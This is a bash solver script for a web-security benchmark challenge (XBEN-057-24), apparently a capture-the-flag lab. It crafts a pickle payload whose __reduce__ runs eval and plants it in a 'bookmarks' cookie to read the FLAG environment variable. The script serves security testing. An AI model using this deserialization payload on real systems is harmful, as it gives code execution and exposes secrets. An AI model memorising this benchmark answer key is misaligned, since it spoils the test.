#!/usr/bin/env bash
# XBEN-057-24 — Python pickle deserialization of a cookie. Proxy-mode twin. The
# bookmarks cookie is base64-pickle and loaded without any guard, so a
# __reduce__ payload runs code that reads the FLAG env var into a bookmark name
# the list page prints.
set -uo pipefail
URL="${1:?usage: $0 http://127.0.0.1:PORT}"
SESSION="xben057p-$$"; cd "$(dirname "$0")"; . ./_proxy-lib.sh
proxy_start "$URL/"; go "$URL/list"; BASE="$(req_of GET list)"; [ -n "$BASE" ] || BASE="$(req_of GET /)"
BOOKMARKS="$(python3 -c "
import pickle, base64
class Evil:
    def __reduce__(self):
        return (eval, (\"[type('X',(),{'name':__import__('os').environ['FLAG'],'url':'#'})()]\",))
print(base64.b64encode(pickle.dumps(Evil(), protocol=0)).decode())")"
"$H5I" websec replay "$BASE" --create --session "$SESSION" \
  --set 'method=GET' --set 'path=/list' \
  --set "cookie.bookmarks=$BOOKMARKS" --set 'cookie.user=poc' >/dev/null
print_flag
